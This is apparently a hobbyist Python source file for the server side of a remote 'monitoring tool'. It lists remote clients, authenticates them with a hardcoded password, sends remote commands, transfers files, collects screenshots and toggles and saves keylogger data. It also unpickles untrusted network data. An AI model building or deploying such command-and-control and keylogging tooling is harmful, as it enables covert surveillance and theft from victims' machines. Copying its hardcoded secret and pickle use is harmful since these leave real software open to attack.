import tkinter as tk
import socket
import threading
import time
import pickle
import os
import mss.tools
import ssl


class App():
    def __init__(self, port, max_clients, timeout):
        self.root = tk.Tk()
        self.root.title("Mathis' monitoring tool")
        self.root.geometry("1600x900")

        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.context.load_cert_chain(certfile="ressources/ssl/cert.pem", keyfile="ressources/ssl/key.pem")

        self.log = Log()

        self.password = "Id6-DIjjf032_ddo"
        self.port = port
        self.max_clients = max_clients
        self.timeout = timeout
        self.selected_client = ["", ""]
        self.socket = None
        self.client = None
        self.id = ""
        self.client_addr = ()
    
        self.menu_bar = tk.Menu(self.root)

        self.filemenu = tk.Menu(self.menu_bar, tearoff=0)
        #self.filemenu.add_command(label="New Connection", command=self.conn_manager)
        self.filemenu.add_command(label="New Connection", command=lambda: threading.Thread(target=self.conn_manager, daemon=True).start())
        self.filemenu.add_separator()
        self.filemenu.add_command(label="Close Connection", command=self.close_conn)
        self.menu_bar.add_cascade(label="Connection", menu=self.filemenu)

        self.keyloggermenu = tk.Menu(self.menu_bar, tearoff=0)
        self.keyloggermenu.add_command(label="ON")
        self.keyloggermenu.add_command(label="OFF")
        self.getkeysmenu = tk.Menu(self.keyloggermenu, tearoff=0)
        self.keyloggermenu.add_cascade(label="Get Keylogger Infos")
        self.getkeysmenu.add_command(label="Text file")
        self.getkeysmenu.add_command(label="Copy")
        self.menu_bar.add_cascade(label="Keylogger", menu=self.keyloggermenu)

        self.terminalmenu = tk.Menu(self.menu_bar, tearoff=0)
        self.terminalmenu.add_command(label="Clear Terminal", command=self.clear_terminal)
        self.menu_bar.add_cascade(label="Terminal", menu=self.terminalmenu)

        self.logsmenu = tk.Menu(self.menu_bar, tearoff=0)
        self.logsmenu.add_command(label="Open Logs", command=self.log.open_)
        self.logsmenu.add_command(label="Reset Logs", command=self.log.clear)
        self.menu_bar.add_cascade(label="Logs", menu=self.logsmenu)

        self.root.config(menu=self.menu_bar)
        
        self.cmd = CMD(self.root)

    def run(self):
        self.root.mainloop()
        
    def close_conn(self):
        try:
            self.log.add("connection and client closed")
            self.client.close()
            self.socket.close()
        except:
            pass

    def conn_manager(self):
        conn_manager_ = ConnMaker()
        self.log.add("new connection ?")
        self.selected_client = conn_manager_.selected_client
        if self.selected_client != ["", ""]:
            self.socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind(("0.0.0.0", self.port))
            self.socket.listen(self.max_clients)
            self.socket.settimeout(1.0)
            
            time0 = time.time()
            while self.client == None and time.time() < time0 + self.timeout:
                try:
                    client, client_addr = self.socket.accept()
                    ssock = self.context.wrap_socket(client, server_side=True)
                    data = ssock.recv(1024).decode()
                    print("dd")
                    if client_addr[0] == self.selected_client[0]:
                        print("d")
                        ssock.send(b"SELECTED")
                        password = ssock.recv(1024).decode()
                        id_ = ssock.recv(1024).decode()
                        if self.password == password and id_ == self.selected_client[1]:
                            ssock.send(b"GRANTED")
                            self.id = id_
                            self.client = ssock
                            self.client_addr = client_addr
                            self.log.add(f"connected to client : {self.selected_client}")
                            return True
                    else:
                        ssock.sendall(b"PINGED")
                        data = ssock.recv(1024)
                        ssock.close()
                    time.sleep(0.1)
                except Exception as e:
                    self.log.add(f"error while trying to select a client in conn_manager function : {e}")
                    
        if self.client == None:
            self.log.add("unable to connect to client")
        
    def clear_terminal(self):
        pass
                
class CMD():
    def __init__(self, root):
        self.root = root
        self.text = tk.Text(root, height=70, width=240, bg="white", fg="black", insertbackground='black')
        self.text.pack()
        
        self.prevent_exit = False
        self.output = [None, None]
        
        self.text.bind("<BackSpace>", self.prevent_backspace)
        self.text.bind("<Return>", self.handle_enter)
        self.text.bind("<Left>", self.on_left_arrow)
        self.text.bind("<Up>", self.on_up_arrow)
        self.text.bind("<Down>", self.on_down_arrow)
        self.text.bind("<Delete>", self.on_delete)
        
        self.prompt()
        
        self.blink_cursor()

    def prompt(self):
        self.text.insert(tk.END, "\n> ")
        self.text.mark_set("insert", tk.END)

    def prevent_backspace(self, event):
        if int(self.text.index(tk.INSERT).split(".")[1]) <= 2:
            return "break"
        return None

    def on_delete(self, event):
        cursor_index = self.text.index(tk.INSERT)
        cursor_col = int(cursor_index.split(".")[1])
        if cursor_col == 1:
            return "break"
        return None
    
    def on_left_arrow(self, event):
        cursor_col = int(self.text.index(tk.INSERT).split(".")[1])
        if cursor_col <= 2:
            return "break"
        return None
    
    def on_down_arrow(self, event):
        return "break"
    def on_up_arrow(self, event):
        return "break"

    def handle_enter(self, event):
        line = self.text.get("insert linestart", "insert lineend").strip()
        command = line.lstrip("> ").strip()
        self.execute_command(command)
        return "break"
    
    def blink_cursor(self):
        current_color = self.text.cget('insertbackground')
        next_color = "white" if current_color == "black" else "black"
        self.text.config(insertbackground=next_color)
        self.root.after(600, self.blink_cursor)

    def execute_command(self, command):
        app.log.add(f"new command : {command}")
        self.prevent_exit = True
        if not os.path.exists("ressources/received_files/"):
            os.makedirs("ressources/received_files/")
        if not os.path.exists("ressources/send_files/"):
            os.makedirs("ressources/send_files/")
        if not os.path.exists("ressources/received_screenshots/"):
            os.makedirs("ressources/received_screenshots/")
        if not os.path.exists("ressources/keylogger/"):
            os.makedirs("ressources/keylogger/")
        
        if app.client == None:
            self.text.insert(tk.END, "\nno client ...")
        else:
            if command == "hello":
                self.text.insert(tk.END, "\nhello !")
            elif command == "exit":
                self.root.destroy()
            else:
                data = pickle.dumps(command)
                if command.startswith("sendfile"):
                    try:
                        path = command.split(" ")[1]
                        if "ressources/send_files/" not in path:
                            path = f"ressources/send_files/{path}"
                        with open(path, "rb") as f:
                            data_ = f.read()
                        data = pickle.dumps((command, data_))
                        
                    except Exception as e:
                        self.text.insert(tk.END, "\nError !")
                        app.log.add(f"error while sending file in execute_command function : {e}")
                        
                thread = threading.Thread(target=self.communication, daemon=True, args=(data, ))
                thread.start()
                thread.join()
                
                header = self.output[0]
                data = self.output[1]
                app.log.add(f"received header : {header}")
                header = header.split(":")
                
                if command == "keylogger save":
                    with open(f"ressources/keylogger/{time.time()}.txt", "w") as f:
                        f.write(str(data))
                
                if header[0] == "TEXT":
                    self.text.insert(tk.END, "\n" + header[2])
                    self.text.insert(tk.END, "\n" + str(data))
                elif header[0] == "FILE":
                    self.text.insert(tk.END, "\nGET_FILE")
                    self.text.insert(tk.END, "\nDone")
                    with open(f"ressources/received_files/{header[2]}", "wb") as f:
                        f.write(data)
                elif header[0] == "MSS_IMG":
                    self.text.insert(tk.END, "\n" + header[2])
                    self.text.insert(tk.END, "\nDone")
                    name = f"ressources/received_screenshots/{time.time()}.png"
                    mss.tools.to_png(data.rgb, data.size, output=name)
                    
                else:
                    app.log.add("mismatched type in header")
                    
                if header[2] == "CLOSE":
                    app.log.add("socket and client closed by cmd")
                    app.client.close()
                    app.socket.close()

        self.prevent_exit = False

        self.prompt()
        
    def communication(self, data):
        app.log.add("trying to send command ...")
        header, data = comm(app.client, f"COMMAND:{len(data)}:NONE", data)
        self.output = [header, data]
        
        
class ConnMaker():
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Connection Manager")
        self.root.geometry("300x400")
        self.running = True

        self.max_clients = app.max_clients
        self.port = app.port
        self.clients = []
        self.ids = []
        self.timeout = app.timeout
        self.selected_client = ["", ""]

        tk.Button(self.root, text="Start Search", command=self.update_search).pack()
        self.conn_list = tk.Listbox(self.root, width=50, height=20)
        self.conn_list.pack()
        tk.Button(self.root, text="Submit Connection", command=self.submit_client).pack()

        self.root.mainloop()

    def submit_client(self):
        try:
            selections = self.conn_list.curselection()
            if len(selections) == 1:
                self.selected_client = [self.clients[selections[0]], self.ids[selections[0]]]
                self.root.destroy()
                app.log.add(f"selected : {self.selected_client}")
                print("selected : ", self.selected_client)
            else:
                print("selection not valid !")
        except:
            print(2, "error !")

    def update_search(self):
        self.conn_list.delete(0, tk.END)
        self.clients = []
        self.ids = []
        local_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None)
        local_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        local_socket.bind(("0.0.0.0", self.port))
        local_socket.listen(self.max_clients)
        local_socket.settimeout(1.0)

        time0 = time.time()
        timeout = self.timeout
        while time0 + timeout > time.time():
            try:
                client, client_addr = local_socket.accept()
                ssock = app.context.wrap_socket(client, server_side=True)
                data = ssock.recv(1024).decode()
                time.sleep(0.1)
                ssock.sendall(b"PINGED")
                if (client_addr[0] not in self.clients) and data == "IDLE":
                    self.clients.append(client_addr[0])
                    self.ids.append(ssock.recv(1024).decode())
                ssock.close()
            except Exception as e:
                app.log.add(f"error while trying to connect to a potential client : {e}")
                
        local_socket.close()
        try:
            for i, j in enumerate(self.clients):
                self.conn_list.insert(i, f"ip address : {j}        id : {self.ids[i]}")
        except Exception as e:
            print("trucc", e)
            app.log.add(f"error while updating ListBox in update_search : {e}")

class Log():
    def __init__(self):
        self.name = f"{time.time()}.txt"
        self.path = f"ressources/logs/{self.name}"
        if not os.path.exists("ressources/logs/"):
            os.makedirs("ressources/logs/")
        with open(self.path, "w") as f:
            f.write(f"log created at time : {self.name[0:-4]}")
            
    def add(self, log):
        try:
            with open(self.path, "a") as f:
                f.write(f"\n{time.time()}>{log}")
        except Exception as e:
            print("log : ", e)
    
    def clear(self):
        with open(self.path, "w") as f:
            f.write("")
            
    def open_(self):
        path = os.path.join(os.getcwd(), self.path)
        os.startfile(path)


def comm(client, header, data):
    try:
        client.send(header.encode())
        client.sendall(data)
        
        header = client.recv(4096).decode()
        bytes_data = b""
        while len(bytes_data) < int(header.split(":")[1]):
            packet = client.recv(65536)
            if not packet:
                break
            bytes_data += packet
        data = pickle.loads(bytes_data)
        
        app.log.add("received header and data in comm function")
        return header, data
    except Exception as e:
        app.log.add(f"error in comm function : {e}")
        return "ERROR:ERROR:ERROR", f"error while receiving data: {e}"
    

if __name__ == "__main__":
    app = App(55277, 20, 3) #port(must be same as client), max client the server can handle, timeout in seconds
    app.run()
    try:
        app.socket.close()
    except:
        pass
